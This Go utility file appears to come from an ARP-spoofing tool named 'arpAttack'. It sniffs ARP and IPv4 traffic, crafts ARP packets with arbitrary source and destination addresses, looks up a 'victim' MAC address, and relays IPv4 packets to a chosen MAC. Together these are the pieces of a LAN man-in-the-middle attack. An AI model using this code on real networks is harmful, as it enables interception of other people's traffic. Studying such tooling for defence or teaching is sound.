package utils

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/rogercoll/arpAttack/pkg/data"
)

// readARP loops until 'stop' is closed. Handles incoming ARP responses
//Per el channel stop només es pot llegir
func ReadARP(handler *pcap.Handle, iface *net.Interface, addresses chan<- data.IPgetMAC, stop <-chan struct{}) {
	defer close(addresses)
	src := gopacket.NewPacketSource(handler, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)
			if arp.Operation != layers.ARPReply || bytes.Equal([]byte(iface.HardwareAddr), arp.SourceHwAddress) {
				// This is a packet I sent.
				continue
			}
			addresses <- data.IPgetMAC{Addr: arp.SourceProtAddress, MAC: arp.SourceHwAddress}
		}
	}
}

func ReadIPv4(handler *pcap.Handle, iface *net.Interface, ipv4Packet chan<- layers.IPv4, stop <-chan struct{}) {
	defer close(ipv4Packet)
	src := gopacket.NewPacketSource(handler, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			ipv4Layer := packet.Layer(layers.LayerTypeIPv4)
			if ipv4Layer == nil {
				continue
			}
			ipv4 := ipv4Layer.(*layers.IPv4)
			ipv4Packet <- *ipv4
		}
	}
}

func WriteARP(arpType uint16, handler *pcap.Handle, iface *net.Interface, addr *net.IPNet, dstMAC, dstAddr []byte) error {
	//we want to request the mac address => broadcast address
	//request => Operation 1 && reply => 2
	eth := layers.Ethernet{
		SrcMAC: iface.HardwareAddr,
		//Broadcast 		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         arpType,
		SourceHwAddress:   []byte(iface.HardwareAddr),
		SourceProtAddress: []byte(addr.IP),
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstAddr,
	}
	// Set up buffer and options for serialization.
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	if err := handler.WritePacketData(buf.Bytes()); err != nil {
		return err
	}

	return nil
}

func FormatAddr(addr string) []byte {
	octets := strings.Split(addr, ".")
	addrbytes := make([]uint8, 4)
	for i, octet := range octets {
		aux, err := strconv.Atoi(octet)
		if err != nil {
			log.Fatal(err)
			return []byte{}
		}
		b := make([]byte, 8)
		binary.LittleEndian.PutUint64(b, uint64(aux))
		addrbytes[i] = b[0]
	}
	sAddr := net.IPv4(addrbytes[0], addrbytes[1], addrbytes[2], addrbytes[3])
	sAddr = sAddr.To4()
	return sAddr
}

func GetInterface(ifaceName string) (*net.Interface, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, iface := range ifaces {
		if iface.Name == ifaceName {
			return &iface, nil
		}
	}
	return nil, fmt.Errorf("Interface %s not found", ifaceName)
}

func GetDstMACAddr(iface *net.Interface, handler *pcap.Handle, addr *net.IPNet, dstAddr string) ([]byte, error) {
	//write missing
	addresses := make(chan data.IPgetMAC)
	ctx := context.Background()
	ctx, cancel := context.WithTimeout(ctx, time.Second*30)
	go ReadARP(handler, iface, addresses, ctx.Done())
	if err := WriteARP(1, handler, iface, addr, []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, FormatAddr(dstAddr)); err != nil {
		log.Printf("error writing arp reply packets on %v: %v", iface.Name, err)
		log.Fatal(err)
	}
	for err := ctx.Err(); err == nil; {
		select {
		case dstMACAddr := <-addresses:
			if net.IP(dstMACAddr.Addr).String() == dstAddr {
				cancel()
				return dstMACAddr.MAC, nil
			}
		case <-ctx.Done():
			return []byte{}, errors.New("Time out: No MAC address found for the victim address")
		}
	}
	return []byte{}, fmt.Errorf("Could not found the MAC address for %s", dstAddr)
}

func GetValidAddress(iface *net.Interface) (*net.IPNet, error) {
	var faddr *net.IPNet //final address
	if addrs, err := iface.Addrs(); err != nil {
		return nil, err
	} else {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				//we need ipv4 not mac addresses
				if ip4 := ipnet.IP.To4(); ip4 != nil {
					//verify that Mask is 4 bytes
					faddr = &net.IPNet{
						IP:   ip4,
						Mask: ipnet.Mask[len(ipnet.Mask)-4:],
					}
					break
				}

			}
		}
	}
	if faddr == nil {
		return nil, errors.New("No good IP found for that interface")
	} else if faddr.IP[0] == 127 {
		return nil, errors.New("Skipping localhost")
	} else if faddr.IP[0] == 172 {
		return nil, errors.New("Skipping docker interfaces")
	} else if faddr.Mask[0] != 0xff || faddr.Mask[1] != 0xff {
		return nil, errors.New("Network(mask) to large for that interface")
	}
	return faddr, nil
}

func WriteIPv4(ip4 layers.IPv4, handler *pcap.Handle, iface *net.Interface, dstMAC []byte) error {
	eth := layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buf, opts, &eth, &ip4)
	if err := handler.WritePacketData(buf.Bytes()); err != nil {
		return err
	}
	return nil
}
